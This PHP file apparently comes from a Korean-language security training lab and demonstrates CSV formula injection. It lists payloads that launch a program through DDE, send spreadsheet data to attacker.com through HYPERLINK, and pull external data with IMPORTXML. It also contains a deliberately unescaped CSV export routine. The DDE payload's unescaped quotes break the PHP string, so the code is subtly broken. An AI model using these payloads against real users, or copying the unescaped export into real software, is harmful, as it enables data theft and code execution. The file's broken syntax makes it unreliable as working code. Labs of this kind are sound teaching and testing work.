<?php
require_once 'TestPage.php';

// 1. 페이지 설정
$page_title = 'CSV Injection';
$description = '<p>사용자 입력이 CSV 파일로 내보내질 때, 특정 문자로 시작하는 입력값(예: <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>)이 스프레드시트 프로그램에서 수식으로 해석되어 악성 코드가 실행될 수 있는 취약점입니다.</p>
<p>이를 통해 정보 유출, 임의 코드 실행 등의 공격이 가능합니다.</p>';

// 2. 페이로드 정의
$payloads = [
    'formulas' => [
        'title' => '🎯 주요 페이로드',
        'description' => '스프레드시트 프로그램에서 수식으로 인식될 수 있는 페이로드입니다.',
        'payloads' => [
            '=cmd|'/C calc'!A0', // Windows 계산기 실행
            '=HYPERLINK("http://attacker.com?data="&A1,"Click me")', // 정보 유출
            '=1+1', // 간단한 수식 실행
            '=IMPORTXML("http://attacker.com/evil.xml","//data")' // 외부 데이터 가져오기
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "CSV로 내보낼 모든 사용자 입력 필드의 시작 문자가 <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code> 인 경우, 해당 문자를 이스케이프 처리하거나 제거합니다. (예: 앞에 <code>'</code>를 추가)",
    "사용자 입력에 대한 엄격한 화이트리스트 기반 유효성 검증을 수행합니다.",
    "스프레드시트 프로그램에서 매크로 실행 경고를 활성화하도록 사용자에게 안내합니다."
];

// 4. 참고 자료 정의
$references = [
    "OWASP - CSV Injection" => "https://owasp.org/www-community/attacks/CSV_Injection"
];

// 5. 테스트 폼 UI 정의
$user_input = htmlspecialchars($_POST['payload'] ?? '');
$test_form_ui = <<<HTML
<div class="info-box">
    <h4>공격 시나리오</h4>
    <ol>
        <li>아래 페이로드 버튼을 클릭하거나 직접 입력합니다.</li>
        <li>'CSV 데이터 생성' 버튼을 클릭합니다.</li>
        <li>생성된 CSV 데이터를 복사하여 Excel, Google Sheets 등 스프레드시트 프로그램에 붙여넣습니다.</li>
        <li>수식이 실행되거나 경고 메시지가 나타나는지 확인합니다.</li>
    </ol>
</div>
<form method="post" class="test-form">
    <h3>🧪 CSV 데이터 생성 테스트</h3>
    <label for="payload">입력값:</label>
    <textarea name="payload" id="payload" placeholder="여기에 페이로드를 입력하세요">{$user_input}</textarea>
    <br><br>
    <button type="submit" class="btn">CSV 데이터 생성</button>
</form>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) {
    $user_input = $form_data['payload'] ?? '';
    $result = '';
    $error = '';

    if (empty($user_input)) {
        $error = "입력값을 넣어주세요.";
    } else {
        // --- 취약점 발생 지점 ---
        $data = [
            ['ID', 'Name', 'Value'],
            [1, 'Test User', $user_input],
            [2, 'Another User', 'Safe Value']
        ];

        $csv_output = '';
        foreach ($data as $row) {
            $csv_output .= implode(',', $row) . "\n";
        }

        $result = "<p>CSV 데이터가 생성되었습니다. 아래 내용을 복사하여 스프레드시트 프로그램에 붙여넣어 보세요.</p>";
        $result .= "<pre><code>" . htmlspecialchars($csv_output) . "</code></pre>";
        $result .= '<button class="btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent).then(() => alert(\'복사 완료!\'))">CSV 데이터 복사</button>';
    }

    return ['result' => $result, 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references);
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();